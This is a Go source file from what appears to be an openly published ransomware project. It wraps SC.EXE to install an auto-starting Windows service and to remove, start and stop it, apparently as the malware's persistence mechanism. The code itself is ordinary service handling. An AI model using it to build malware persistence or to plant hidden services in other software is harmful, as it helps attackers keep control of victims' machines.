// +build windows

package win

import (
    "os/exec"

    "github.com/sug0/sr-ransomware/go/errors"
)

func InstallService(name, display, executable string) error {
    err := exec.Command(
        "SC.EXE",
        "CREATE", name,
        "start=", "auto",
        "DisplayName=", display,
        "binpath=", executable,
    ).Run()
    return errors.WrapIfNotNil(pkg, "failed to install service", err)
}

func RemoveService(name string) error {
    err := exec.Command("SC.EXE", "DELETE", name).Run()
    return errors.WrapIfNotNil(pkg, "failed to remove service", err)
}

func StartService(name string) error {
    err := exec.Command("SC.EXE", "START", name).Run()
    return errors.WrapIfNotNil(pkg, "failed to start service", err)
}

func StopService(name string) error {
    err := exec.Command("SC.EXE", "STOP", name).Run()
    return errors.WrapIfNotNil(pkg, "failed to stop service", err)
}
